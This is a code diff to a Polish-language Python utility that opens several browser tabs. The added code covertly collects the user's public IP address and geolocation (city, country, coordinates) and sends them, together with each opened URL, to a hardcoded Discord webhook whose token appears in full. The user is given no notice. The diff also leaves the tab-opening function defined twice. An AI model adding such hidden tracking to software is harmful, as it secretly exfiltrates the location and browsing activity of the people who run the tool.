@@ -2,9 +2,13 @@ import webbrowser
 from colorama import init, Fore
 import os
 import time
-
+import requests
+import datetime
 
 init(autoreset=True)
+
+default_browser = None
+default_tab_count = 1
 
 def print_ascii_art():
     gray = Fore.LIGHTBLACK_EX  # Jasnoszary kolor
@@ -37,9 +41,58 @@ def open_multiple_tabs(urls, delay):
     for url in urls:
         try:
             webbrowser.open_new_tab(url)
-            time.sleep(delay)  # Opóźnienie w sekundach
+            time.sleep(delay)
+            send_log_to_discord(f"Otworzono kartę: {url}")
         except webbrowser.Error:
-            print("Nie udało się otworzyć przeglądarki lub karty na wskazany adres: " + url)
+            error_message = f"Nie udało się otworzyć przeglądarki lub karty na wskazany adres: {url}"
+            print(error_message)
+            send_log_to_discord(error_message)
+
+def get_public_ip():
+    response = requests.get("https://httpbin.org/ip")
+    if response.status_code == 200:
+        return response.json()["origin"]
+    return "Nie można uzyskać IP"
+
+def get_geolocation(ip):
+    response = requests.get(f"http://ip-api.com/json/{ip}")
+    if response.status_code == 200:
+        data = response.json()
+        return f"{data['city']}, {data['country']} (Lat: {data['lat']}, Lon: {data['lon']})"
+    return "Nie można uzyskać geolokalizacji"
+
+def send_log_to_discord(message):
+    ip = get_public_ip()
+    geolocation = get_geolocation(ip)
+    webhook_url = "https://discord.com/api/webhooks/1163925900044283925/t8g-nZ815t1To0AcK1c4flPosagCk6p-wHr_EgF7ypNhdN_ARBf3HptfgVxgUFQKhDM1"
+
+    embed = {
+        "title": "Log z otwarcia karty",
+        "description": message,
+        "color": 5814783,
+        "fields": [
+            {"name": "Adres IP", "value": ip, "inline": False},
+            {"name": "Geolokalizacja", "value": geolocation, "inline": False}
+        ],
+        "footer": {"text": "Logi z przeglądarki"}
+    }
+
+    data = {"embeds": [embed]}
+    response = requests.post(webhook_url, json=data)
+    if response.status_code != 204:
+        print("Nie udało się wysłać logu na Discorda.")
+
+def open_multiple_tabs(urls, delay):
+    for url in urls:
+        try:
+            webbrowser.open_new_tab(url)
+            time.sleep(delay)
+            send_log_to_discord(f"Otworzono kartę: {url}")
+        except webbrowser.Error:
+            error_message = f"Nie udało się otworzyć przeglądarki lub karty na wskazany adres: {url}"
+            print(error_message)
+            send_log_to_discord(error_message)
+
 
 def main():
     print_ascii_art()
